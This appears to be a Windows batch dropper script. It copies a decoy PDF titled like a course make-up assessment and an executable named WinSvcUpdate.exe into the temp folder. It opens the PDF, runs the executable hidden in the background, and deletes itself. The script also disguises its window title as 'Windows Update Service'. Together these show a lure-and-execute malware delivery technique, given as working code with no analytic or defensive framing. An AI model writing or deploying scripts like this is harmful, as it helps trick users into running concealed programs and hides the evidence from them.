@echo off
title Windows Update Service
mode con: cols=0 lines=0

REM Copy PDF to temp
copy "C:\Users\bense\Desktop\ACCT 8211 Make up Assessment.pdf" "%temp%\ACCT 8211 Make up Assessment.pdf" > nul

REM Copy EXE to temp  
copy "C:\Users\bense\Desktop\WinSvcUpdate.exe" "%temp%\WinSvcUpdate.exe" > nul

REM Open PDF
start "" "%temp%\ACCT 8211 Make up Assessment.pdf"

REM Wait a bit
timeout /t 2 /nobreak > nul

REM Run EXE hidden
start /B "" "%temp%\WinSvcUpdate.exe"

REM Self delete
del "%~f0" > nul
